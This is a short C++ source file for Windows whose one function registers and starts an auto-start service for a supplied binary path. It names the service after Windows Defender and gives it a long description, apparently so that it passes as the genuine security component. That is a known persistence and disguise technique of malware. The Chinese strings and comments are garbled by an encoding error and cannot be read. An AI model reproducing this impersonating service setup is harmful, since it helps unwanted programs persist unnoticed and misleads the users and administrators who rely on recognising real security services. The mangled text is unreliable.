#include "SystemService.h"
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")


BOOL RegisterSystemService(WCHAR lpszDriverPath[]) {

	WCHAR pszServiceName[MAX_PATH] = L"Windows Defender�Զ�����";
	WCHAR pszServiceDesc[MAX_PATH] = L"ʹ���Windows Defender��������״̬������˷����ѽ��û�ֹͣ����Windows Defender���޷���������״̬������ζ���޷��޸����ܲ����İ�ȫ©�������ҹ���Ҳ�����޷�ʹ�á�";

	// Ϊ·���������ţ���ΪCreateService�е�lpBinaryPathNameҪ������ţ�����·����û�ո�
	WCHAR lpBinaryPathName[MAX_PATH + 2];
	wsprintf(lpBinaryPathName, L"\"%s\"", lpszDriverPath);

	SC_HANDLE shOSCM = NULL, shCS = NULL;
	SERVICE_STATUS ss;
	DWORD dwErrorCode = 0;
	BOOL bSuccess = FALSE;
	// �򿪷�����ƹ��������ݿ�
	shOSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!shOSCM) {
		return FALSE;
	}

	// �����������ÿ�������
	shCS = CreateService(shOSCM, pszServiceName, pszServiceName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,	SERVICE_ERROR_NORMAL, lpBinaryPathName, NULL, NULL, NULL, NULL, NULL);
	if (!shCS){
		return FALSE;
	}

	// ���÷��������
	SERVICE_DESCRIPTION ServiceDesc;
	ServiceDesc.lpDescription = pszServiceDesc;
	ChangeServiceConfig2(shCS, SERVICE_CONFIG_DESCRIPTION, &ServiceDesc);

	if (!StartService(shCS, 0, NULL))	{
		return FALSE;
	}

	if (shCS) {
		CloseServiceHandle(shCS);
		shCS = NULL;
	}
	if (shOSCM)	{
		CloseServiceHandle(shOSCM);
		shOSCM = NULL;
	}
	return TRUE;
}